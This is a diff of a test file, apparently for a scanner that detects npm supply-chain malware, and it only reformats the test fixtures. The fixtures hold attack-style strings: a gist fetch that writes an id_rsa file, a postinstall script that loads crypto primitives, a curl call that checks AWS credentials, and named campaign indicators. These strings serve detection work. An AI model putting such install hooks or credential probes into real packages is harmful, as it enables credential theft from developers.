@@ -18,7 +18,9 @@ function makeFile(path, content) {
 const cleanPkg = { name: 'safe-package', version: '1.0.0', scripts: {} };
 const cleanRegistryMeta = {
   time: { '1.0.0': '2026-01-01T00:00:00.000Z' },
-  versions: { '1.0.0': { _npmUser: { name: 'safe-publisher' }, dist: { integrity: 'sha512-abc' } } },
+  versions: {
+    '1.0.0': { _npmUser: { name: 'safe-publisher' }, dist: { integrity: 'sha512-abc' } },
+  },
 };
 
 // ─── D1: Campaign marker scan ────────────────────────────────────────
@@ -124,7 +126,12 @@ test('D4: detects ddjidd564.github.io + .aws/ in postinstall', () => {
 });
 
 test('D4: detects gist.github.com + id_rsa in JS source', () => {
-  const files = [makeFile('index.js', 'fetch("https://gist.github.com/raw/abc").then(r => r.text()).then(d => fs.writeFileSync("id_rsa", d))')];
+  const files = [
+    makeFile(
+      'index.js',
+      'fetch("https://gist.github.com/raw/abc").then(r => r.text()).then(d => fs.writeFileSync("id_rsa", d))'
+    ),
+  ];
   const result = scanGistsExfil(files, cleanPkg);
   assert.equal(result.triggered, true);
 });
@@ -218,7 +225,10 @@ test('D6: does not flag non-matching name', () => {
 test('D7: detects Fernet + ECDH in postinstall', () => {
   const pkg = {
     name: 'test',
-    scripts: { postinstall: 'node -e "const Fernet = require(\"fernet\"); const ecdh = require(\"crypto\").createECDH(\"secp256k1\")"' },
+    scripts: {
+      postinstall:
+        'node -e "const Fernet = require("fernet"); const ecdh = require("crypto").createECDH("secp256k1")"',
+    },
   };
   const result = scanCryptoPrimitives([], pkg);
   assert.equal(result.triggered, true);
@@ -257,7 +267,9 @@ test('D8: detects cargo-build-helper-2026 in Cargo.lock', () => {
 });
 
 test('D8: detects cargo-build-helper-2026 in package-lock.json', () => {
-  const files = [makeFile('package-lock.json', JSON.stringify({ packages: { 'cargo-build-helper-2026': {} } }))];
+  const files = [
+    makeFile('package-lock.json', JSON.stringify({ packages: { 'cargo-build-helper-2026': {} } })),
+  ];
   const result = scanXorKey(files);
   assert.equal(result.triggered, true);
 });
@@ -273,7 +285,9 @@ test('D8: does not trigger on normal files', () => {
 test('D9: detects sts.amazonaws.com in postinstall', () => {
   const pkg = {
     name: 'test',
-    scripts: { postinstall: 'curl -X POST https://sts.amazonaws.com/ -d "Action=GetCallerIdentity"' },
+    scripts: {
+      postinstall: 'curl -X POST https://sts.amazonaws.com/ -d "Action=GetCallerIdentity"',
+    },
   };
   const result = scanCredValidation([], pkg);
   assert.equal(result.triggered, true);
@@ -281,7 +295,9 @@ test('D9: detects sts.amazonaws.com in postinstall', () => {
 });
 
 test('D9: detects api.github.com/user in JS source', () => {
-  const files = [makeFile('index.js', 'fetch("https://api.github.com/user").then(r => console.log(r))')];
+  const files = [
+    makeFile('index.js', 'fetch("https://api.github.com/user").then(r => console.log(r))'),
+  ];
   const result = scanCredValidation(files, cleanPkg);
   assert.equal(result.triggered, true);
 });
